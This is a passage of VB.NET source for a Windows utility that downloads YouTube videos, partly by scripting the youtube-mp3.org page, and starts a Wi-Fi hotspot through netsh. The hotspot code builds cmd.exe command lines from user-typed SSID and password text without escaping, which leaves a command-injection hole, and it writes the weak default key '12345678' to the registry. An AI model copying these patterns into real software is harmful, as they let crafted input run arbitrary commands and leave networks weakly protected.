                        MsgBox(exception2.Message, MsgBoxStyle.Critical, "Error...")
                    End Try
                    uriString = Me.yts.availableVideoFormat((index - 1)).VideoUrl
                    Me.dwnFile = Path.GetTempFileName
                Else
                    uriString = Me.yts.availableVideoFormat((index - 1)).VideoUrl
                    Me.dwnFile = Form1.filePath
                End If
                Me.lblResult.Text = "Downloading..."
                Me.lblResult.Refresh()
                lblsize.Show()
                Try
                    Me.wc = New WebClient
                    AddHandler Me.wc.DownloadProgressChanged, New DownloadProgressChangedEventHandler(AddressOf Me.wc_DownloadProgressChanged)
                    AddHandler Me.wc.DownloadFileCompleted, New AsyncCompletedEventHandler(AddressOf Me.wc_DownloadFileCompleted)
                    Me.lnkCancel.Enabled = True
                    Me.wc.DownloadFileAsync(New Uri(uriString), Me.dwnFile)
                    Me.lblResult.Visible = False
                Catch exception3 As Exception
                    MsgBox(exception3.Message, MsgBoxStyle.Critical, "Error...")
                    ghostProgressbar1.SendToBack()
                    lblprogress.Hide()
                    lblsize.Hide()
                    Try
                        File.Delete(Me.dwnFile)
                        If Me._audio Then
                            File.Delete(Form1.filePath)
                        End If
                    Catch exception4 As Exception
                        MsgBox(exception4.Message, MsgBoxStyle.Critical, "Error...")
                    End Try
                    Me.unlockGui()
                End Try
                Me.lblResult.Text = ""
            End If
        End If
    End Sub
    'Function to choose format for SaveFileDialog
    Private Function chooseFormat(<Out()> ByRef index As Integer) As String
        Dim str As String
        Dim dialog As New SaveFileDialog
        If Me._audio Then
            dialog.FileName = If(String.IsNullOrEmpty(Me.title), "AudioTrack [by YT]", Me.title)
            str = ""
            Dim file As YouTubeVideoFile
            For Each file In Me.yts.availableVideoFormat
                str = (str & Me.MapFormatCodeToFilter(file.ddd))
            Next
            str = str.Substring(0, (str.Length - 1))
            dialog.Filter = str
            dialog.DefaultExt = "mp3"
        Else
            dialog.FileName = If(String.IsNullOrEmpty(Me.title), "video  [by YT]", Me.title)
            str = ""
            Dim num As Integer = 0
            Dim file As YouTubeVideoFile
            For Each file In Me.yts.availableVideoFormat
                str = (str & Me.MapFormatCodeToFilter(file.ddd))
                num += 1
                If (file.ddd = &H23) Then
                    dialog.FilterIndex = num
                End If
            Next
            If (str.Length > 0) Then
                str = str.Substring(0, (str.Length - 1))
            End If
            dialog.Filter = str
            dialog.DefaultExt = "mp4"
        End If
        dialog.AddExtension = True
        dialog.RestoreDirectory = True
        If (dialog.ShowDialog = DialogResult.OK) Then
            index = dialog.FilterIndex
            Return dialog.FileName
        End If
        index = 0
        Return Nothing
    End Function
    'Function to get contents of YouTube Video
    Private Function getContent(ByVal url As String) As String
        Try
            Me.lblResult.Text = "Sending request to YouTube.."
            Me.lblResult.Refresh()
            Dim request As HttpWebRequest = DirectCast(WebRequest.Create(url), HttpWebRequest)
            Me.lblResult.Text = "Getting YouTube response.."
            Me.lblResult.Refresh()
            Dim response As HttpWebResponse = DirectCast(request.GetResponse, HttpWebResponse)
            Dim reader As New StreamReader(response.GetResponseStream)
            Dim str As String = reader.ReadToEnd
            reader.Close()
            Return str
        Catch exception1 As Exception
            Return Nothing
        End Try
    End Function
    'Paste button
    Private Sub Paste_btn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Paste_btn.Click
        Me.txtUrl.Text = Clipboard.GetText.Trim
        If String.IsNullOrEmpty(Me.txtUrl.Text) Then
            Me.txtUrl.Focus()
        End If
    End Sub
    'Clear button
    Private Sub Clear_Btn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Clear_Btn.Click
        txtUrl.Clear()
    End Sub
    'Settings to lock the program
    Private Sub lockGui()
        Me.btnAll.Enabled = False
        Me.txtUrl.Enabled = False
        Me.Paste_btn.Enabled = False
        Me.Clear_Btn.Enabled = False
        Me.Cursor = Cursors.WaitCursor
    End Sub
    'Function to get available Formats for YouTube Video
    Private Function MapFormatCodeToFilter(ByVal formatCode As Byte) As String
        Select Case formatCode
            Case 5
                Return If(Me._audio, "MP3 Audio [22KHz] (*.mp3)|*.mp3|", "LQ Flash Video [MP3.22KHz] (*.flv)|*.flv|")
            Case 6
                Return If(Me._audio, "MP3 Audio [44KHz] (*.mp3)|*.mp3|", "LQ Flash Video [MP3.44KHz] (*.flv)|*.flv|")
            Case 13
                Return If(Me._audio, "", "Mobile Video XX-Small (*.3gp)|*.3gp|")
            Case 17
                Return If(Me._audio, "", "Mobile Video X-Small (*.3gp)|*.3gp|")
            Case 18
                Return If(Me._audio, "", "Standard Youtube Quality 360p (*.mp4)|*.mp4|")
            Case &H22
                Return If(Me._audio, "[HQ] Advanced Audio Coding [22KHz] (*.aac)|*.aac|", "LQ Flash Video 360p [AAC] (*.flv)|*.flv|")
            Case &H23
                Return If(Me._audio, "[HQ] Advanced Audio Coding [44KHz] (*.aac)|*.aac|", "HQ Flash Video 480p (*.flv)|*.flv|")
            Case &H24
                Return If(Me._audio, "", "Mobile Video Small (*.3gp)|*.3gp|")
            Case &H25
                Return If(Me._audio, "", "Full HD 1080p (*.mp4)|*.mp4|")
            Case &H26
                Return If(Me._audio, "", "4K Resolution (*.mp4)|*.mp4|")
            Case 43
                Return If(Me._audio, "", "WebM Video 360p (*.webm)|*.webm|")
            Case 44
                Return If(Me._audio, "", "WebM Video 480p (*.webm)|*.webm|")
            Case 45
                Return If(Me._audio, "", "WebM HD Video 720p (*.webm)|*.webm|")
            Case 37
                Return If(Me._audio, "", "HD High Quality 1080p (*.mp4)|*.mp4|")
            Case 38
                Return If(Me._audio, "", "HD High Quality 3072p (*.mp4)|*.mp4|")
            Case 22
                Return If(Me._audio, "", "HD 720p (*.mp4)|*.mp4|")
            Case &H52
                Return If(Me._audio, "", "3D Standard Youtube Quality 360p (*.mp4)|*.mp4|")
            Case &H54
                Return If(Me._audio, "", "3D HD 720p (*.mp4)|*.mp4|")
            Case 34
                Return If(Me._audio, "", "360p (*.flv)|*.flv|")
            Case 35
                Return If(Me._audio, "", "480p (*.flv)|*.flv|")
            Case 36
                Return If(Me._audio, "", "240p (*.flv)|*.flv|")
        End Select
        Return ""
    End Function
    'Function to delete a file when download is cancelled
    Private Shared Function PromptOverwrite(ByRef path As String) As Boolean
        Try
            File.Delete(Form1.filePath)
        Catch exception1 As Exception
        End Try
        path = Form1.filePath
        Return True
    End Function
    'Settings For Unlocking the program
    Private Sub unlockGui()
        Me._audio = False
        Me.btnAll.Enabled = True
        Me.txtUrl.Enabled = True
        Me.lblResult.Text = ""
        Me.lblResult.Visible = True
        Me.lblprogress.Hide()
        Me.lblsize.Hide()
        Me.ghostProgressbar1.SendToBack()
        Me.Cursor = Cursors.Default
        Me.txtUrl.Focus()
        Me.Paste_btn.Enabled = True
        Me.Clear_Btn.Enabled = True
    End Sub
    'Occurs When Download is completed
    Private Sub wc_DownloadFileCompleted(ByVal sender As Object, ByVal e As AsyncCompletedEventArgs)
        Me.lnkCancel.Enabled = False
        If e.Cancelled Then
            MessageBox.Show("Download Cancelled.", Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Try
                File.Delete(Me.dwnFile)
                If Me._audio Then
                    File.Delete(Form1.filePath)
                End If
            Catch exception1 As Exception
                MsgBox(exception1.Message, MsgBoxStyle.Critical, "Error...")
            End Try
            Me.unlockGui()
        Else
            Me.wc = Nothing
            Try
                Dim info As New FileInfo(Me.dwnFile)
                If (info.Length < 4) Then
                    MsgBox("This is a song , it will be saved as MP3 file.", MsgBoxStyle.Information, "YouTube Downloader")
                    info = Nothing
                    Try
                        txtUrl.ReadOnly = True
                        File.Delete(Me.dwnFile)
                    Catch ex As Exception
                        MsgBox(ex.Message, MsgBoxStyle.Critical, "Error...")
                    End Try
                    TimerH1.Start()
                    Me.unlockGui()
                    ghostProgressbar1.Hide()
                    ghostProgressbar1.SendToBack()
                    lblprogress.Hide()
                    lblsize.Hide()
                    Me.btnAll.Enabled = False
                    Me.txtUrl.Enabled = False
                    Me.Paste_btn.Enabled = False
                    Me.Clear_Btn.Enabled = False
                    Me.Cursor = Cursors.WaitCursor
                    Exit Sub
                Else
                    info = Nothing
                    Me.ghostProgressbar1.Value = 0
                    If Me._audio Then
                        Try
                            File.Delete(Me.dwnFile)
                        Catch ex As Exception
                            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error...")
                        End Try
                    End If
                    MyBase.Activate()
                End If
            Catch ex As Exception
                MyBase.Activate()
                MsgBox(ex.Message, MsgBoxStyle.Critical, "Error...")
            End Try
            Me.unlockGui()
            Me.lblResult.Text = "Done "
            MsgBox("Your download is completed successfully , Thanks for using YouTube Downloader.", MsgBoxStyle.Information, "YouTube Downloader")
            ghostProgressbar1.Hide()
            ghostProgressbar1.SendToBack()
            lblprogress.Hide()
            lblsize.Hide()
        End If
    End Sub
    'Codes to increase progress bar during the download process and to calculate the downloaded Kbs
    Private Sub wc_DownloadProgressChanged(ByVal sender As Object, ByVal e As DownloadProgressChangedEventArgs)
        Me.ghostProgressbar1.Value = e.ProgressPercentage
        lblprogress.Text = ghostProgressbar1.Value.ToString + "%"
        Dim str As String = Nothing
        If Not Me._audio Then
            Dim strArray As String() = New String(5 - 1) {}
            strArray(0) = "  ["
            Dim num As Long = (e.BytesReceived / &H400)
            strArray(1) = num.ToString
            strArray(2) = "/"
            strArray(3) = (e.TotalBytesToReceive / &H400).ToString
            strArray(4) = " Kb]"
            str = String.Concat(strArray)
            lblsize.Text = str.ToString
        End If
    End Sub
    'Settings For Youtube Downloader
    Private _audio As Boolean = False
    Private dwnFile As String
    Private Shared filePath As String
    Private title As String
    Private tooltip As ToolTip
    Private wc As WebClient
    'Codes to cancel Download
    Private Sub lnkCancel_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles lnkCancel.LinkClicked
        wc.CancelAsync()
        ghostProgressbar1.Hide()
        btnAll.Show()
        txtUrl.Focus()
        lblprogress.Hide()
        lblsize.Hide()
        Me.unlockGui()
    End Sub
    'Click on the picture to open your default WebBrowser and Navigate to YouTube's Page
    Private Sub YouTube_Navigator_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles YouTube_Navigator.Click
        Process.Start("http://www.youtube.com")
    End Sub
    'TimerH1 Used To make WebBrowser0 navigate to "http://www.youtube-mp3.org"
    Private Sub TimerH1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerH1.Tick
        WB0.Navigate("http://www.youtube-mp3.org")
        lblResult.Text = "Converting and preparing to download......[Takes about a minute]"
        TimerH2.Start()
        TimerH1.Stop()
    End Sub
    'TimerH2 Used To Paste YouTube URL in TextBox of WebBrowser0
    Private Sub TimerH2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerH2.Tick
        WB0.Document.GetElementById("youtube-url").SetAttribute("value", txtUrl.Text)
        TimerH3.Start()
        TimerH2.Stop()
    End Sub
    'TimerH3 Used To click on convert button in WebBrowser0
    Private Sub TimerH3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerH3.Tick
        WB0.Document.GetElementById("submit").InvokeMember("click")
        TimerH4.Start()
        TimerH3.Stop()
    End Sub
    'TimerH4 Used To get 3 MP3 URLs
    Private Sub TimerH4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerH4.Tick
        Try
            Dim dl_link As HtmlElement = WB0.Document.GetElementById("dl_link")
            Dim link As HtmlElementCollection = dl_link.GetElementsByTagName("a")
            Dim url1 As String = link(0).GetAttribute("href")
            Dim url2 As String = link(1).GetAttribute("href")
            Dim url3 As String = link(2).GetAttribute("href")
            MP3URL1.Text = url1
            MP3URL2.Text = url2
            MP3URL3.Text = url3
        Catch ex As ArgumentOutOfRangeException
            MsgBox("This music can't be downloaded due to its copyright.", MsgBoxStyle.Critical, "Error...")
        End Try
        TimerH5.Start()
        TimerH4.Stop()
    End Sub
    'TimerH5 Used To make webbrowsers navigate to 3 MP3 URLs [Only one of them is working]
    Private Sub TimerH5_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerH5.Tick
        WB1.Navigate(MP3URL1.Text)
        WB2.Navigate(MP3URL2.Text)
        WB3.Navigate(MP3URL3.Text)
        lblResult.Text = ""
        txtUrl.ReadOnly = False
        unlockGui()
        TimerH5.Stop()
    End Sub
    '------------------------------------------------------------------------------------
    'Codes for File Downloader - Program(I)
    '-------------------------------------------
    'Code To Download File Using WebBrowser
    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        If FILEURL.Text.StartsWith("http") Or FILEURL.Text.StartsWith("https") Then
            DOWNLOADER.Navigate(FILEURL.Text)
        Else
            MsgBox("Invalid URL , Notice that : URL must begins with (http) or (https).", MsgBoxStyle.Critical, "Error...")
        End If
    End Sub
    'Paste Button
    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        FILEURL.Text = Clipboard.GetText.Trim
        If String.IsNullOrEmpty(Me.FILEURL.Text) Then
            Me.FILEURL.Focus()
        End If
    End Sub
    'Clearing FILEURL TextBox
    Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button11.Click
        FILEURL.Clear()
        FILEURL.Focus()
    End Sub
    Private Sub FILEURL_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FILEURL.TextChanged
        If FILEURL.Text = "" Then
            Button9.Enabled = False
        Else
            Button9.Enabled = True
        End If
    End Sub
    '--------------------------------------------------------------------------------------
    'Codes for Wi-Fi Hotspot - Program(I) - Without ICS
    '------------------------------------------
    Private Sub Form1_FormClosingForWIFIHOTSPOT(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
        If start.Enabled = False Then
            MsgBox("Stop Wi-Fi Hotspot Without ICS before closing the program.", MsgBoxStyle.Critical, "Error...")
            e.Cancel = True
        End If
        'Process.Start("CMD", "/C netsh wlan stop hostednetwork")
    End Sub
    Private Sub stophotspot_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles stophotspot.Click
        Dim oProcess As New Process()
        Dim oStartInfo As New ProcessStartInfo("cmd.exe", "/C netsh wlan stop hostednetwork")
        oStartInfo.UseShellExecute = False
        oStartInfo.RedirectStandardOutput = True
        oProcess.StartInfo = oStartInfo
        oProcess.Start()
        Dim sOutput As String
        Using oStreamReader As System.IO.StreamReader = oProcess.StandardOutput
            sOutput = oStreamReader.ReadToEnd()
            RichTextBox1.Text = sOutput.ToString
        End Using
        MsgBox("Hotspot stopped successfully", MsgBoxStyle.Information, "Wi-Fi Hotspot")
        hotspot.ReadOnly = False
        pass.ReadOnly = False
        stophotspot.Enabled = False
        start.Enabled = True
    End Sub

    Private Sub start_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles start.Click
        If startButton.Text = "&Stop" Then
            MsgBox("You need to stop Wi-Fi Hotspot With ICS before starting Wi-Fi Hotspot Without ICS", MsgBoxStyle.Critical, "Error...")
            Exit Sub
        End If
        Try
            If hotspot.Text = "" Then
                MsgBox("Hotspot Name can't be empty", MsgBoxStyle.Critical, "Error...")
            End If
            If pass.TextLength < 8 Then
                MsgBox("Password should be 8+ characters", MsgBoxStyle.Critical, "Error...")
                If pass.Text = "" Then
                    MsgBox("Password can't be empty", MsgBoxStyle.Critical, "Error...")
                End If
            Else
                Dim oProcess As New Process()
                Dim oStartInfo As New ProcessStartInfo("cmd.exe", String.Format("/c {0} & {1} & {2}", "netsh wlan set hostednetwork mode=allow ssid=" & hotspot.Text & " key=" & pass.Text, "netsh wlan start hostednetwork", "exit"))
                oStartInfo.UseShellExecute = False
                oStartInfo.RedirectStandardOutput = True
                oProcess.StartInfo = oStartInfo
                oProcess.Start()
                Dim sOutput As String
                Using oStreamReader As System.IO.StreamReader = oProcess.StandardOutput
                    sOutput = oStreamReader.ReadToEnd()
                    RichTextBox1.Text = sOutput.ToString
                End Using
                If RichTextBox1.Text.Contains("The hosted network couldn't be started.") Then
                    MsgBox("Failed to establish a hotspot , Either you don't have a Wi-Fi adapter or your Wi-Fi adapter doesn't support starting a Wi-Fi hotspot", MsgBoxStyle.Critical, "Error...")
                Else
                    MsgBox("Hotspot started successfully", MsgBoxStyle.Information, "Wi-Fi Hotspot")
                    hotspot.ReadOnly = True
                    pass.ReadOnly = True
                    start.Enabled = False
                    stophotspot.Enabled = True
                End If
            End If
        Catch ex As Exception
            MsgBox("Failed to establish a hotspot" & ex.Message, MsgBoxStyle.Information, "Wi-Fi Hotspot")
        End Try
    End Sub
    Private Sub showchkbox_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles showchkbox.CheckedChanged
        If showchkbox.CheckState = CheckState.Checked Then
            pass.UseSystemPasswordChar = False
        End If
        If showchkbox.CheckState = CheckState.Unchecked Then
            pass.UseSystemPasswordChar = True
        End If
    End Sub

    Private Sub about_hotspot_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles about_hotspot.LinkClicked
        MsgBox("This program is coded by David Sanculane , For more programs , Visit : http://www.davidsoft.webs.com", MsgBoxStyle.Information, "About Wi-Fi Hotspot...")
    End Sub

    '--------------------------------------------------------------------------------------
    'Codes for Wi-Fi Hotspot - Program(I) - With ICS
    '------------------------------------------
    Private Sub StartUpRegistryCheck()

        Dim SSID_Val_Status As Boolean
        SSID_Val_Status = True
        Dim Key_Val_Status As Boolean
        Key_Val_Status = True
        '----------------------------------------------------------------------------------------------
        Dim WLANHotspotSSIDRegKey As RegistryKey
        WLANHotspotSSIDRegKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WLANHotspot", True)

        Dim SSID As String
        Try
            SSID = WLANHotspotSSIDRegKey.GetValue("SSID")
            If SSID.LongCount.ToString > 0 And SSID.LongCount.ToString <= 32 Then
                ssidTextBox.Text = SSID
            Else
                MsgBox("Registry value for: SSID must be between 1 to 32 character.", MsgBoxStyle.Critical, "Registry Value Error")
                ssidTextBox.Text = "MyHotspot"
                Try
                    WLANHotspotSSIDRegKey.SetValue("SSID", "MyHotspot")
                    WLANHotspotSSIDRegKey.Close()
                    StatusLbl.Text = "Status: Default SSID is written!"
                Catch
                    MsgBox("Unable to write default registry value for: SSID", MsgBoxStyle.Critical, "Registry Access Error")
                End Try
            End If
        Catch
            MsgBox("Unable to read registry value for: SSID", MsgBoxStyle.Critical, "Registry Access Error")
            ssidTextBox.Text = "MyHotspot"
            Try
                WLANHotspotSSIDRegKey.SetValue("SSID", "MyHotspot")
                WLANHotspotSSIDRegKey.Close()
                StatusLbl.Text = "Status: Default SSID is written!"
            Catch
                SSID_Val_Status = False
                MsgBox("Unable to write default registry value for: SSID", MsgBoxStyle.Critical, "Registry Access Error")
            End Try
        End Try
        '----------------------------------------------------------------------------------------------
        Dim WLANHotspotKeyRegKey As RegistryKey
        WLANHotspotKeyRegKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WLANHotspot", True)

        Dim Key As String
        Try
            Key = WLANHotspotKeyRegKey.GetValue("Key")
            If Key.LongCount.ToString >= 8 And Key.LongCount.ToString <= 64 Then
                passwordTextBox.Text = Key
            Else
                MsgBox("Registry value for: Key must be between 8 to 64 character.", MsgBoxStyle.Critical, "Registry Value Error")
                passwordTextBox.Text = "12345678"
                Try
                    WLANHotspotKeyRegKey.SetValue("Key", "12345678")
                    WLANHotspotKeyRegKey.Close()
                    StatusLbl.Text = "Status: Default Key is written!"
                Catch
                    MsgBox("Unable to write default registry value for: Key", MsgBoxStyle.Critical, "Registry Access Error")
                End Try
            End If
        Catch
            MsgBox("Unable to read registry value for: Key", MsgBoxStyle.Critical, "Registry Access Error")
            passwordTextBox.Text = "12345678"
            Try
                WLANHotspotKeyRegKey.SetValue("Key", "12345678")
                WLANHotspotKeyRegKey.Close()
                StatusLbl.Text = "Status: Default Key is written!"
            Catch
                Key_Val_Status = False
                MsgBox("Unable to write default registry value for: Key", MsgBoxStyle.Critical, "Registry Access Error")
            End Try
        End Try

        If SSID_Val_Status = False Or Key_Val_Status = False Then
            Dim WLANHotspotRepairRegistry As RegistryKey
            Try
                WLANHotspotRepairRegistry = Registry.LocalMachine.CreateSubKey("SOFTWARE\WLANHotspot")
                WLANHotspotRepairRegistry.SetValue("SSID", "MyHotspot", RegistryValueKind.String)
                WLANHotspotRepairRegistry.SetValue("Key", "12345678", RegistryValueKind.String)
                WLANHotspotRepairRegistry.Close()
                StatusLbl.Text = "Status: Application registry error repaired!"
            Catch
                MsgBox("Unable to repair application default registry!", MsgBoxStyle.Critical, "Registry Access Error")
            End Try
        End If


    End Sub

    Private Sub GetIcsAdapters()

        connectionComboBox.Items.Clear()

        Dim InternetShareableAdapterScope As New ManagementScope()
        Dim InternetShareableAdapterQuery As New SelectQuery("Win32_NetworkAdapter", "NetConnectionStatus=2")
        Dim InternetShareableAdapterSearcher As New ManagementObjectSearcher(InternetShareableAdapterScope, InternetShareableAdapterQuery)

        Try
            For Each InternetShareableAdapter As ManagementObject In InternetShareableAdapterSearcher.[Get]()
                Dim InternetShareableAdapterId As String = InternetShareableAdapter("NetConnectionID").ToString()

                connectionComboBox.Items.Add(InternetShareableAdapterId)

            Next
        Catch
        End Try

        If connectionComboBox.Items.Count = 0 Then
            connectionComboBox.Items.Add("No connection Available!")
        End If

        connectionComboBox.SelectedIndex = 0

    End Sub

    Private Sub IcsRefreshThread_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles IcsRefreshThread.DoWork

        refreshConnectionButton.Enabled = False
        GetIcsAdapters()
        refreshConnectionButton.Enabled = True

    End Sub

    Private Sub MainDialog_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'CheckForIllegalCrossThreadCalls = False
        System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = False
        SkinSoft.VisualStyler.VisualStyler.RestoreApplicationSkin()

        If Not System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\netsh.exe") Then
            MsgBox("netsh.exe Not found!", MsgBoxStyle.Critical, "Error!")

            Me.Dispose()
            Application.Exit()
        Else

            StartUpRegistryCheck()
            If startButton.Text = "&Start" Then
                IcsRefreshThread.RunWorkerAsync()
            End If
        End If

    End Sub

    Private Sub ShowPasswordChkBox_Click(sender As Object, e As EventArgs) Handles ShowPasswordChkBox.Click

        If ShowPasswordChkBox.CheckState = CheckState.Checked Then
            passwordTextBox.PasswordChar = Nothing
        ElseIf ShowPasswordChkBox.CheckState = CheckState.Unchecked Then
            passwordTextBox.PasswordChar = "●"
        End If

    End Sub

    Public Sub EnableUserInterface()

        ssidTextBox.Enabled = True
        passwordTextBox.Enabled = True
        connectionComboBox.Enabled = True
        refreshConnectionButton.Enabled = True

    End Sub

    Public Sub DisableUserInterface()

        ssidTextBox.Enabled = False
        passwordTextBox.Enabled = False
        connectionComboBox.Enabled = False
        refreshConnectionButton.Enabled = False

    End Sub

    Private Sub ConnectIcs()

        If connectionComboBox.SelectedItem.ToString = "No connection Available!" Then
            StatusLbl.Text = "Status: Hotspot started without ICS!"
            startButton.Text = "&Stop"
            startButton.Enabled = True
        Else
            StatusLbl.Text = "Status: Trying to create ICS with " & connectionComboBox.SelectedItem.ToString & "."

            '------------------------------------------------------------------------------------------------------
            Dim IcsVirtualAdapterScope As New ManagementScope()
            Dim IcsVirtualAdapterQuery As New SelectQuery("Win32_NetworkAdapter", "Description=""Microsoft Hosted Network Virtual Adapter""")
            Dim IcsVirtualAdapterSearcher As New ManagementObjectSearcher(IcsVirtualAdapterScope, IcsVirtualAdapterQuery)
            'Dim IcsVirtualAdapterIdArray As New ComboBox

            Try
                For Each IcsVirtualAdapter As ManagementObject In IcsVirtualAdapterSearcher.[Get]()
                    Dim IcsVirtualAdapterId As String = IcsVirtualAdapter("NetConnectionID").ToString()
                    IcsVirtualAdapterIdArray.Items.Add(IcsVirtualAdapterId)
                Next
            Catch

            End Try
            If IcsVirtualAdapterIdArray.Items.Count > 1 Then
                VirtualAdapterSelectionDialog.ShowDialog()
            Else
                IcsVirtualAdapterIdArray.SelectedIndex = 0
                IcsVirtualAdapterId = IcsVirtualAdapterIdArray.SelectedItem.ToString
            End If

            IcsVirtualAdapterIdArray.Items.Clear()
            StatusLbl.Text = "Status: Selected virtual adapter: " & IcsVirtualAdapterId & "."
            '------------------------------------------------------------------------------------------------------

            Try
                IcsManager.ShareConnection(IcsManager.GetConnectionByName(connectionComboBox.SelectedItem.ToString), IcsManager.GetConnectionByName(IcsVirtualAdapterId))
                StatusLbl.Text = "Status: Shared internet from " & connectionComboBox.SelectedItem.ToString & " to " & IcsVirtualAdapterId.ToString & "."
                startButton.Text = "&Stop"
                startButton.Enabled = True
            Catch
                StatusLbl.Text = "Status: Network shell busy, retrying ICS with " & connectionComboBox.SelectedItem.ToString & "."
                'startButton.Text = "&Stop"
                'startButton.Enabled = True
                Threading.Thread.Sleep(1000)
                ConnectIcs()
            End Try

        End If

    End Sub

    Private Sub IcsConnectThread_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles IcsConnectThread.DoWork

        ConnectIcs()

    End Sub

    Private Sub ConnectFunction()

        startButton.Enabled = False

        Dim ConnectionCriteria As Boolean
        ConnectionCriteria = False

        If ssidTextBox.Text.LongCount.ToString > 0 And passwordTextBox.Text.LongCount.ToString > 7 Then
            ConnectionCriteria = True
        Else
            ConnectionCriteria = False
        End If

        If ConnectionCriteria = True Then

            StatusLbl.Text = "Status: Trying to create hotspot!"
            DisableUserInterface()


            CurrentRegistryWriteThread.RunWorkerAsync()

            Dim SSID As String
            SSID = """" & ssidTextBox.Text & """"

            Dim PSWD As String
            PSWD = """" & passwordTextBox.Text & """"

            'Dim SysPath As String
            'SysPath = Environment.GetFolderPath(Environment.SpecialFolder.System)

            'Dim CommandSeperator As String
            'CommandSeperator = "&&"
            If System.IO.File.Exists(SysPath & "\netsh.exe") Then
                Dim ConnectionProcess = New Process
                ConnectionProcess.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.System) & "\cmd.exe"
                ConnectionProcess.StartInfo.Arguments = "/k echo off" & CommandSeperator & SysPath & "\netsh.exe wlan set hostednetwork mode=allow ssid=" & SSID & " key=" & PSWD & CommandSeperator & SysPath & "\netsh.exe  wlan start hostednetwork"
                ConnectionProcess.StartInfo.UseShellExecute = False
                ConnectionProcess.StartInfo.CreateNoWindow = True
                ConnectionProcess.StartInfo.RedirectStandardOutput = True
                ConnectionProcess.StartInfo.RedirectStandardError = True
                ConnectionProcess.Start()
                ConnectionProcess.WaitForExit(4000)
                If Not ConnectionProcess.HasExited Then
                    ConnectionProcess.Kill()
                    Dim SuccessOutPut As IO.StreamReader = ConnectionProcess.StandardOutput()
                    Dim ErrorOutPut As IO.StreamReader = ConnectionProcess.StandardError()
                    Dim ProcessSuccess As String
                    Dim ProcessError As String
                    ProcessSuccess = SuccessOutPut.ReadToEnd
                    ProcessError = ErrorOutPut.ReadToEnd
                    If ProcessError = "" Then
                        If ProcessSuccess.Contains("The hosted network couldn't be started") Then
                            StatusLbl.Text = "Status: Hotspot couldn't be started!"
                            EnableUserInterface()
                            startButton.Enabled = True
                        ElseIf ProcessSuccess.Contains("The hosted network started") Then
                            StatusLbl.Text = "Status: Hotspot started!"
                            IcsConnectThread.RunWorkerAsync()
                            'startButton.Text = "&Stop"
                            'startButton.Enabled = True

                        End If
                    Else
                        EnableUserInterface()
                        MsgBox(ProcessError, MsgBoxStyle.Critical, "Error")
                    End If
                    SuccessOutPut.Close()
                    ErrorOutPut.Close()
                    ConnectionProcess.Close()
                End If
            Else
                MsgBox("netsh.exe Not found!", MsgBoxStyle.Critical, "Error!")
            End If
        Else
            StatusLbl.Text = "Status: Check given SSID and Password!"
            startButton.Enabled = True
        End If
    End Sub
    Private Sub DisconnectFunction()
        startButton.Enabled = False
        StatusLbl.Text = "Status: Trying to stop hotspot!"
        IcsManager.ShareConnection(Nothing, Nothing)
        'Dim SysPath As String
        'SysPath = Environment.GetFolderPath(Environment.SpecialFolder.System)

        'Dim CommandSeperator As String
        'CommandSeperator = "&&"
        If System.IO.File.Exists(SysPath & "\netsh.exe") Then
            Dim ConnectionProcess = New Process
            ConnectionProcess.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.System) & "\cmd.exe"
            ConnectionProcess.StartInfo.Arguments = "/k echo off" & CommandSeperator & SysPath & "\netsh.exe  wlan stop hostednetwork"
            ConnectionProcess.StartInfo.UseShellExecute = False
            ConnectionProcess.StartInfo.CreateNoWindow = True
            ConnectionProcess.StartInfo.RedirectStandardOutput = True
            ConnectionProcess.StartInfo.RedirectStandardError = True
            ConnectionProcess.Start()
            ConnectionProcess.WaitForExit(4000)
            If Not ConnectionProcess.HasExited Then
                ConnectionProcess.Kill()
                Dim SuccessOutPut As IO.StreamReader = ConnectionProcess.StandardOutput()
                Dim ErrorOutPut As IO.StreamReader = ConnectionProcess.StandardError()
                Dim ProcessSuccess As String
                Dim ProcessError As String
                ProcessSuccess = SuccessOutPut.ReadToEnd
                ProcessError = ErrorOutPut.ReadToEnd
                If ProcessError = "" Then
                    If ProcessSuccess.Contains("The hosted network stopped") Then
                        StatusLbl.Text = "Status: Hotspot stopped!"
                        EnableUserInterface()
                        IcsRefreshThread.RunWorkerAsync()
                        startButton.Text = "&Start"
                        startButton.Enabled = True

                    End If
                Else
                    EnableUserInterface()
                    MsgBox(ProcessError, MsgBoxStyle.Critical, "Error")
                End If
                SuccessOutPut.Close()
                ErrorOutPut.Close()
                ConnectionProcess.Close()
            End If

        Else
            MsgBox("netsh.exe Not found!", MsgBoxStyle.Critical, "Error!")
        End If
    End Sub
    Private Sub WriteCurrentConfigToRegistry()
        Dim WLANHotspotWriteRegKey As RegistryKey
        Try
